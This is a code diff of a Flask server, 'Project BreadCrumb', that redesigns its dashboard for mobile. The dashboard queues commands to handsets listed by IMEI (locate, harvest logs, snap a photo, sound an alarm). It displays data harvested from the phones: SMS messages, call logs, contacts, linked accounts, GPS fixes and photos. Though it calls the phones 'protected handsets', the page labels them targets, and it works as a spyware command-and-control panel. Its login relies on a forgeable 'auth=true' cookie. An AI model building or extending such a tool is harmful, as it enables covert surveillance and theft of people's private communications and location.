@@ -58,122 +58,205 @@ def init_cloud_db():
 
 init_cloud_db()
 
-FORENSIC_ADMIN_TEMPLATE = """
+MOBILE_OPTIMIZED_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Project BreadCrumb - Forensic & Media Vault</title>
+    <title>Project BreadCrumb - Master Dispatch</title>
     <style>
         :root { --bg: #121212; --card: #1e1e1e; --primary: #bb86fc; --text: #e0e0e0; --accent: #03dac6; --danger: #cf6679; }
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 15px; }
-        .container { max-width: 1100px; margin: auto; }
-        .card { background: var(--card); border-radius: 8px; padding: 20px; margin-bottom: 20px; border: 1px solid #333; }
-        h2, h3 { color: var(--primary); margin-top: 0; }
-        table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 12px; }
-        th, td { padding: 10px; text-align: left; border-bottom: 1px solid #333; }
-        th { color: var(--accent); }
-        pre { background: #000; padding: 10px; border-radius: 4px; color: #03dac6; max-height: 150px; overflow-y: auto; font-size: 11px; }
-        .btn { background: var(--primary); color: #000; border: none; padding: 6px 10px; border-radius: 4px; font-weight: bold; cursor: pointer; text-decoration: none; display: inline-block; margin: 2px; font-size: 11px; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 10px; box-sizing: border-box; }
+        .container { max-width: 800px; margin: auto; }
+        .card { background: var(--card); border-radius: 10px; padding: 15px; margin-bottom: 15px; border: 1px solid #333; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
+        h2, h3 { color: var(--primary); margin-top: 0; font-size: 1.1rem; }
+        .logout-btn { background: var(--danger); color: #fff; padding: 5px 10px; border-radius: 4px; text-decoration: none; font-size: 11px; float: right; font-weight: bold; }
+        
+        /* Dropdown & Selector */
+        .select-group { margin-top: 10px; }
+        select { width: 100%; padding: 12px; background: #000; color: #fff; border: 1px solid var(--primary); border-radius: 6px; font-size: 14px; margin-top: 5px; box-sizing: border-box; }
+
+        /* Responsive Button Grid */
+        .btn-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 10px; }
+        .btn { background: var(--primary); color: #000; border: none; padding: 10px; border-radius: 6px; font-weight: bold; cursor: pointer; text-align: center; text-decoration: none; font-size: 12px; display: block; }
         .btn-danger { background: var(--danger); color: #fff; }
         .btn-accent { background: var(--accent); color: #000; }
-        .media-grid { display: flex; flex-wrap: wrap; gap: 10px; margin-top: 10px; }
-        .media-thumb { background: #000; border: 1px solid #444; border-radius: 4px; padding: 5px; text-align: center; }
-        .media-thumb img { max-width: 120px; max-height: 120px; display: block; border-radius: 2px; margin-bottom: 5px; }
+        .btn-full { grid-column: span 2; }
+
+        /* Navigation Tabs for Harvested Data */
+        .nav-tabs { display: flex; gap: 5px; overflow-x: auto; margin-bottom: 10px; padding-bottom: 5px; }
+        .tab-btn { background: #2a2a2a; color: var(--text); border: none; padding: 8px 12px; border-radius: 4px; font-size: 11px; cursor: pointer; white-space: nowrap; }
+        .tab-btn.active { background: var(--primary); color: #000; font-weight: bold; }
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
+
+        pre { background: #000; padding: 10px; border-radius: 6px; color: var(--accent); max-height: 200px; overflow-y: auto; font-size: 11px; white-space: pre-wrap; word-break: break-all; }
+        .media-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(100px, 1fr)); gap: 8px; margin-top: 10px; }
+        .media-thumb { background: #000; border: 1px solid #444; border-radius: 6px; padding: 5px; text-align: center; }
+        .media-thumb img { width: 100%; height: 90px; object-fit: cover; border-radius: 4px; display: block; margin-bottom: 4px; }
+        .device-info { font-size: 12px; color: #aaa; margin-top: 8px; line-height: 1.4; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="card">
-            <h2>Project BreadCrumb Forensic Vault</h2>
-            <p>Master Dispatch & Evidence Extraction Hub</p>
-            <a href="/logout" class="btn btn-danger" style="float: right; margin-top: -45px;">Logout</a>
-        </div>
+            <h2>BreadCrumb Dispatch Hub</h2>
+            <a href="/logout" class="logout-btn">Logout</a>
+            <div style="clear: both;"></div>
 
-        <div class="card">
-            <h3>Registered Protected Handsets</h3>
-            <table>
-                <tr>
-                    <th>IMEI / ID</th>
-                    <th>Hardware & Profile</th>
-                    <th>Owner</th>
-                    <th>Status</th>
-                    <th>Commands</th>
-                </tr>
-                {% for dev in devices %}
-                <tr>
-                    <td><code>{{ dev[0] }}</code></td>
-                    <td><b>{{ dev[1] }}</b></td>
-                    <td>{{ dev[2] }}<br><span style="color: #888; font-size: 10px;">{{ dev[3] }}</span></td>
-                    <td style="color: var(--accent); font-weight: bold;">{{ dev[7] }}</td>
-                    <td>
-                        <form method="POST" action="/api/queue-command" style="display:inline;">
-                            <input type="hidden" name="imei" value="{{ dev[0] }}">
-                            <input type="hidden" name="command" value="LOCATE">
-                            <button type="submit" class="btn btn-accent">📍 Locate</button>
-                        </form>
-                        <form method="POST" action="/api/queue-command" style="display:inline;">
-                            <input type="hidden" name="imei" value="{{ dev[0] }}">
-                            <input type="hidden" name="command" value="HARVEST_FORENSICS">
-                            <button type="submit" class="btn">🕵️ Harvest Logs</button>
-                        </form>
-                        <form method="POST" action="/api/queue-command" style="display:inline;">
-                            <input type="hidden" name="imei" value="{{ dev[0] }}">
-                            <input type="hidden" name="command" value="SNAP">
-                            <button type="submit" class="btn">📸 Snap</button>
-                        </form>
-                        <form method="POST" action="/api/queue-command" style="display:inline;">
-                            <input type="hidden" name="imei" value="{{ dev[0] }}">
-                            <input type="hidden" name="command" value="ALARM">
-                            <button type="submit" class="btn btn-danger">🚨 Alarm</button>
-                        </form>
-                    </td>
-                </tr>
-                {% else %}
-                <tr><td colspan="5" style="text-align: center; color: #777;">No active devices synced.</td></tr>
-                {% endfor %}
-            </table>
-        </div>
-
-        <div class="card">
-            <h3>📸 Captured Media Vault (Photos & Evidence)</h3>
-            <div class="media-grid">
-                {% for item in media_items %}
-                <div class="media-thumb">
-                    <a href="/media/{{ item[2] }}" target="_blank">
-                        <img src="/media/{{ item[2] }}" alt="Evidence">
-                    </a>
-                    <span style="font-size: 10px; color: #aaa;">{{ item[1] }}<br>{{ item[3] }}</span>
-                </div>
-                {% else %}
-                <p style="color: #777; font-size: 12px;">No media captured yet. Click "Snap" above to capture evidence.</p>
-                {% endfor %}
+            <!-- Front Page Dropdown Selector -->
+            <div class="select-group">
+                <label style="font-size: 12px; color: var(--accent);">Select Target Handset:</label>
+                <select id="deviceSelect" onchange="filterDevice()">
+                    {% for dev in devices %}
+                    <option value="{{ dev[0] }}" {% if loop.first %}selected{% endif %}>
+                        {{ dev[2] }} (IMEI: {{ dev[0] }} - {{ dev[1] }})
+                    </option>
+                    {% else %}
+                    <option value="">No Active Devices Synced</option>
+                    {% endfor %}
+                </select>
             </div>
         </div>
 
+        {% for dev in devices %}
+        <div class="device-card card" data-imei="{{ dev[0] }}" style="display: {% if loop.first %}block{% else %}none{% endif %};">
+            <h3>Handset: {{ dev[2] }}</h3>
+            <div class="device-info">
+                <b>IMEI:</b> <code>{{ dev[0] }}</code><br>
+                <b>Model:</b> {{ dev[1] }} | <b>Email:</b> {{ dev[3] }}<br>
+                <b>Status:</b> <span style="color: var(--accent); font-weight: bold;">{{ dev[7] }}</span>
+            </div>
+
+            <h4 style="color: var(--primary); font-size: 12px; margin: 12px 0 6px 0;">Command Dispatch Suite</h4>
+            <div class="btn-grid">
+                <form method="POST" action="/api/queue-command">
+                    <input type="hidden" name="imei" value="{{ dev[0] }}">
+                    <input type="hidden" name="command" value="LOCATE">
+                    <button type="submit" class="btn btn-accent btn-full">📍 Locate Fix</button>
+                </form>
+                <form method="POST" action="/api/queue-command">
+                    <input type="hidden" name="imei" value="{{ dev[0] }}">
+                    <input type="hidden" name="command" value="HARVEST_FORENSICS">
+                    <button type="submit" class="btn btn-full">🕵️ Harvest Logs</button>
+                </form>
+                <form method="POST" action="/api/queue-command">
+                    <input type="hidden" name="imei" value="{{ dev[0] }}">
+                    <input type="hidden" name="command" value="SNAP">
+                    <button type="submit" class="btn">📸 Snap Photo</button>
+                </form>
+                <form method="POST" action="/api/queue-command">
+                    <input type="hidden" name="imei" value="{{ dev[0] }}">
+                    <input type="hidden" name="command" value="ALARM">
+                    <button type="submit" class="btn btn-danger">🚨 Sound Alarm</button>
+                </form>
+            </div>
+        </div>
+        {% endfor %}
+
+        <!-- Clean Categorized Data Pages / Tabs -->
         <div class="card">
-            <h3>Harvested Forensic Intelligence (Refreshed Live)</h3>
-            <table>
-                <tr>
-                    <th>Last Updated</th>
-                    <th>IMEI</th>
-                    <th>Data Category</th>
-                    <th>Extracted Content</th>
-                </tr>
-                {% for log in forensic_logs %}
-                <tr>
-                    <td>{{ log[4] }}</td>
-                    <td><code>{{ log[1] }}</code></td>
-                    <td><b>{{ log[2] }}</b></td>
-                    <td><pre>{{ log[3] }}</pre></td>
-                </tr>
+            <h3>Harvested Evidence & Vault</h3>
+            <div class="nav-tabs">
+                <button class="tab-btn active" onclick="switchTab(event, 'mediaTab')">📸 Media Vault</button>
+                <button class="tab-btn" onclick="switchTab(event, 'callsTab')">📞 Call Logs</button>
+                <button class="tab-btn" onclick="switchTab(event, 'smsTab')">💬 SMS Messages</button>
+                <button class="tab-btn" onclick="switchTab(event, 'contactsTab')">📇 Contacts</button>
+                <button class="tab-btn" onclick="switchTab(event, 'accountsTab')">👤 Accounts</button>
+            </div>
+
+            <!-- Media Vault Tab -->
+            <div id="mediaTab" class="tab-content active">
+                <div class="media-grid">
+                    {% for item in media_items %}
+                    <div class="media-thumb" data-imei="{{ item[1] }}">
+                        <a href="/media/{{ item[2] }}" target="_blank">
+                            <img src="/media/{{ item[2] }}" alt="Vault Media">
+                        </a>
+                        <span style="font-size: 9px; color: #aaa;">{{ item[3] }}</span>
+                    </div>
+                    {% else %}
+                    <p style="font-size: 11px; color: #777;">No media captured yet.</p>
+                    {% endfor %}
+                </div>
+            </div>
+
+            <!-- Call Logs Tab -->
+            <div id="callsTab" class="tab-content">
+                {% for log in forensic_logs if log[2] == 'Call Logs' %}
+                <div class="forensic-item" data-imei="{{ log[1] }}">
+                    <p style="font-size: 10px; color: var(--accent); margin: 5px 0;">Updated: {{ log[4] }}</p>
+                    <pre>{{ log[3] }}</pre>
+                </div>
                 {% else %}
-                <tr><td colspan="4" style="text-align: center; color: #777;">No forensic logs harvested yet. Click "Harvest Logs" above.</td></tr>
+                <p style="font-size: 11px; color: #777;">No call logs harvested.</p>
                 {% endfor %}
-            </table>
+            </div>
+
+            <!-- SMS Messages Tab -->
+            <div id="smsTab" class="tab-content">
+                {% for log in forensic_logs if log[2] == 'SMS Messages' %}
+                <div class="forensic-item" data-imei="{{ log[1] }}">
+                    <p style="font-size: 10px; color: var(--accent); margin: 5px 0;">Updated: {{ log[4] }}</p>
+                    <pre>{{ log[3] }}</pre>
+                </div>
+                {% else %}
+                <p style="font-size: 11px; color: #777;">No SMS logs harvested.</p>
+                {% endfor %}
+            </div>
+
+            <!-- Contacts Tab -->
+            <div id="contactsTab" class="tab-content">
+                {% for log in forensic_logs if log[2] == 'Device Contacts' %}
+                <div class="forensic-item" data-imei="{{ log[1] }}">
+                    <p style="font-size: 10px; color: var(--accent); margin: 5px 0;">Updated: {{ log[4] }}</p>
+                    <pre>{{ log[3] }}</pre>
+                </div>
+                {% else %}
+                <p style="font-size: 11px; color: #777;">No contacts harvested.</p>
+                {% endfor %}
+            </div>
+
+            <!-- Accounts Tab -->
+            <div id="accountsTab" class="tab-content">
+                {% for log in forensic_logs if log[2] == 'Linked Accounts / Profiles' or log[2] == 'GPS Location' %}
+                <div class="forensic-item" data-imei="{{ log[1] }}">
+                    <p style="font-size: 10px; color: var(--accent); margin: 5px 0;"><b>{{ log[2] }}</b> - {{ log[4] }}</p>
+                    <pre>{{ log[3] }}</pre>
+                </div>
+                {% else %}
+                <p style="font-size: 11px; color: #777;">No account profiles or location fixes harvested.</p>
+                {% endfor %}
+            </div>
         </div>
     </div>
+
+    <script>
+        function filterDevice() {
+            const selectedImei = document.getElementById('deviceSelect').value;
+            document.querySelectorAll('.device-card').forEach(card => {
+                card.style.display = card.getAttribute('data-imei') === selectedImei ? 'block' : 'none';
+            });
+            // Filter vault items by selected IMEI
+            document.querySelectorAll('.media-thumb, .forensic-item').forEach(el => {
+                if (!selectedImei || el.getAttribute('data-imei') === selectedImei) {
+                    el.style.display = '';
+                } else {
+                    el.style.display = 'none';
+                }
+            });
+        }
+
+        function switchTab(evt, tabId) {
+            document.querySelectorAll('.tab-content').forEach(tc => tc.classList.remove('active'));
+            document.querySelectorAll('.tab-btn').forEach(tb => tb.classList.remove('active'));
+            document.getElementById(tabId).classList.add('active');
+            evt.currentTarget.classList.add('active');
+        }
+
+        window.onload = filterDevice;
+    </script>
 </body>
 </html>
 """
@@ -181,12 +264,12 @@ FORENSIC_ADMIN_TEMPLATE = """
 LOGIN_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="en">
-<head><title>Master Login</title>
+<head><title>Master Login</title><meta name="viewport" content="width=device-width, initial-scale=1.0">
 <style>
-body { font-family: sans-serif; background: #121212; color: #e0e0e0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-.card { background: #1e1e1e; padding: 25px; border-radius: 8px; width: 300px; border: 1px solid #333; }
-input { width: 100%; padding: 10px; margin: 8px 0; border-radius: 4px; border: 1px solid #444; background: #000; color: #fff; box-sizing: border-box; }
-button { background: #bb86fc; color: #000; border: none; padding: 10px; border-radius: 4px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 10px; }
+body { font-family: sans-serif; background: #121212; color: #e0e0e0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; padding: 15px; }
+.card { background: #1e1e1e; padding: 25px; border-radius: 8px; width: 100%; max-width: 320px; border: 1px solid #333; box-sizing: border-box; }
+input { width: 100%; padding: 12px; margin: 8px 0; border-radius: 6px; border: 1px solid #444; background: #000; color: #fff; box-sizing: border-box; font-size: 14px; }
+button { background: #bb86fc; color: #000; border: none; padding: 12px; border-radius: 6px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 10px; font-size: 14px; }
 </style></head>
 <body>
 <div class="card"><h2 style="color: #bb86fc; text-align: center; margin-top:0;">Master Auth</h2>
@@ -200,14 +283,14 @@ button { background: #bb86fc; color: #000; border: none; padding: 10px; border-r
 @app.route('/', methods=['GET', 'POST'])
 def cloud_dashboard():
     if not MASTER_USER or not MASTER_PASS:
-        return "<h3>[Security Error]: Master credentials not configured in environment variables.</h3>", 500
+        return "<h3>[Security Error]: Master credentials not configured.</h3>", 500
     if request.cookies.get("auth") != "true":
         if request.method == 'POST':
             if request.form.get("username") == MASTER_USER and request.form.get("password") == MASTER_PASS:
                 resp = redirect(url_for('cloud_dashboard'))
                 resp.set_cookie("auth", "true")
                 return resp
-            return render_template_string(LOGIN_TEMPLATE, error="Invalid Credentials")
+            return render_template_string(LOGIN_TEMPLATE)
         return render_template_string(LOGIN_TEMPLATE)
 
     conn = sqlite3.connect(CLOUD_DB)
@@ -220,7 +303,7 @@ def cloud_dashboard():
     media_items = cursor.fetchall()
     conn.close()
 
-    return render_template_string(FORENSIC_ADMIN_TEMPLATE, devices=devices, forensic_logs=forensic_logs, media_items=media_items)
+    return render_template_string(MOBILE_OPTIMIZED_TEMPLATE, devices=devices, forensic_logs=forensic_logs, media_items=media_items)
 
 @app.route('/logout')
 def logout():
@@ -250,29 +333,18 @@ def api_sync():
 @app.route('/api/upload-forensics', methods=['POST'])
 def upload_forensics():
     data = request.json or {}
-    imei = data.get("imei")
-    data_type = data.get("data_type")
-    content = data.get("content")
-    if not imei or not data_type: 
-        return jsonify({"error": "Missing parameters"}), 400
+    imei, data_type, content = data.get("imei"), data.get("data_type"), data.get("content")
+    if not imei or not data_type: return jsonify({"error": "Missing parameters"}), 400
 
     conn = sqlite3.connect(CLOUD_DB)
     cursor = conn.cursor()
     cursor.execute('''
         INSERT INTO forensic_logs (imei, data_type, content, timestamp)
         SELECT ?, ?, ?, CURRENT_TIMESTAMP
-        WHERE NOT EXISTS (
-            SELECT 1 FROM forensic_logs WHERE imei = ? AND data_type = ?
-        )
+        WHERE NOT EXISTS (SELECT 1 FROM forensic_logs WHERE imei = ? AND data_type = ?)
     ''', (imei, data_type, content, imei, data_type))
-    
     if cursor.rowcount == 0:
-        cursor.execute('''
-            UPDATE forensic_logs 
-            SET content = ?, timestamp = CURRENT_TIMESTAMP 
-            WHERE imei = ? AND data_type = ?
-        ''', (content, imei, data_type))
-        
+        cursor.execute('UPDATE forensic_logs SET content = ?, timestamp = CURRENT_TIMESTAMP WHERE imei = ? AND data_type = ?', (content, imei, data_type))
     conn.commit()
     conn.close()
     return jsonify({"status": "refreshed"})
